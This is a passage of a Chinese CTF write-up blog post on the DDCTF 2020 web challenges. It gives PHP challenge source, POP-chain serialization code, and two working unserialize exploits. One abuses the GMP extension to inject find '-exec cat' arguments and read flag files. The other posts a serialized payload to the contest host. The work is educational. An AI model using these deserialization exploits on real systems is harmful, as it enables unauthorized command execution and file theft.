class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Repeater</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;content;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$bullet</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bullet&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$bullet</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Give Me Something!&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bullet</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$infos</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>();<br>&#125;<span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$obstacle</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br>    <span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>    <span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$bullet</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>转了一圈没啥思路，只能试着读那个hint.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Prompter</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;hint))<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$this</span>-&gt;hint);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Repeater</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;content;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$chain1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$chain2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Repeater</span>();<br><span class="hljs-variable">$chain3</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Prompter</span>();<br><br><span class="hljs-comment">//$chain3-&gt;hint = &quot;/hint/hint.php&quot;;</span><br><span class="hljs-variable">$chain2</span>-&gt;content=<span class="hljs-variable">$chain3</span>;<br><span class="hljs-variable">$chain1</span>-&gt;page = <span class="hljs-variable">$chain2</span>;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$chain1</span>)) ;<br><span class="hljs-comment">//O%3A7%3A%22Display%22%3A2%3A%7Bs%3A8%3A%22contents%22%3Bs%3A14%3A%22%2Fhint%2Fhint.php%22%3Bs%3A4%3A%22page%22%3BO%3A8%3A%22Repeater%22%3A2%3A%7Bs%3A14%3A%22%00Repeater%00cont%22%3BN%3Bs%3A7%3A%22content%22%3BO%3A8%3A%22Prompter%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00hint%22%3Bs%3A10%3A%22.%2Ftest.php%22%3B%7D%7D%7D</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>然后bullet传进去后显示有个 &#x2F;FlagNeverFall&#x2F;suffix_flag.php，然而最后利用的是一个include函数，就算include了没有highlight_file(<em>_FILE</em>_)等我们依然没有办法拿到内容。</p>
+<p>后面虽然注意到了$kw0ng这个值有些奇怪，以及看起来似乎有用但不知道有啥用的phpinfo ，但依然没有搜索到有价值的信息，无奈看WP</p>
+<p>然后发现 <a target="_blank" rel="noopener" href="http://117.51.137.166/hint/hint.php">http://117.51.137.166/hint/hint.php</a> 能直接访问。。。一时语塞 个人感觉是题目出糊了，应该是反序列化读 hint&#x2F;hint.php 来读 flag 的前半部分的（也有可能是干扰项，如果真是这样只能怪自己脑洞太小:) ）</p>
+<p>写到这里时环境关了。。信息只能从WP拿了</p>
+<p>hint.php：<br>Good Job! You’ve got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i’ll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!</p>
+<p>GMP利用相关的参考：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6781">https://xz.aliyun.com/t/6781</a><br><a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=70513">https://bugs.php.net/bug.php?id=70513</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1267/">https://paper.seebug.org/1267/</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p>
+<p>大致的利用思路就是如果我们有一个可控的反序列化入口，目标后端PHP安装了GMP插件，如果我们找到一个可控的__wakeup魔术方法，我们就可以修改反序列化前声明的对象属性，并配合场景产生实际的安全问题。</p>
+<p>一个可行的exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;kw0ng = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;find /FlagNeverFall &#x27;</span> . <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$this</span>-&gt;flag));<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Display</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">contents</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;page-&gt;cont);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Display</span>();<br><span class="hljs-variable">$obstacle</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$mc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable">$mc</span>-&gt;flag = <span class="hljs-string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;<br><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;3&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:63:&quot;-iname sth -or -exec cat /FlagNeverFall/suffix_flag.php ; -quit&quot;;i:1;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#125;&#x27;</span>;<br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;i:1;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:3;&#125;&#125;&#x27;</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$exploit</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$mc</span>-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$exploit</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+<p>这里WP的师傅说不用 GMP 也能打，这里没太看懂啥意思，Mark一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$hint</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;<br>&#125;<br><br><br><span class="hljs-variable">$showoff</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShowOff</span>();<br><span class="hljs-variable">$myclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-variable">$myclass</span>-&gt;flag = <span class="hljs-string">&#x27;-exec cat /flag &#123;&#125; ;&#x27;</span>;<br><span class="hljs-variable">$showoff</span>-&gt;page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiddleMan</span>();<br><span class="hljs-variable">$showoff</span>-&gt;page-&gt;content = [<span class="hljs-variable">$myclass</span>, <span class="hljs-string">&#x27;get_flag&#x27;</span>];<br><br><span class="hljs-variable">$paylod</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$showoff</span>));<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://117.51.137.166/atkPWsr2x3omRZFi.php?bullet=&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span> . <span class="hljs-variable">$paylod</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这次比赛考的点还是比较新颖的。比如Web和Re结合的Web签到题。。<br>还有就是不太常见的Go语言这回被拿来出题了，看来还是啥都要会一点<br>好多题都卡在最后一步可能还是思路还不够广的原因吧，之后还是要多刷点题</p>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/" class="category-chain-item">实战总结</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DDCTF 2020 Web WP</div>
+      <div>https://m0ck1ng-b1rd.github.io/2020/08/03/writeup/DDCTF 2020 Web WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>何语灵</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年8月3日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/08/04/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87/" title="某大学新版学工系统SQL注入与WAF绕过">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">某大学新版学工系统SQL注入与WAF绕过</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/02/writeup/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/" title="BUUCTF RE crackMe WP 详细解析">
+                        <span class="hidden-mobile">BUUCTF RE crackMe WP 详细解析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
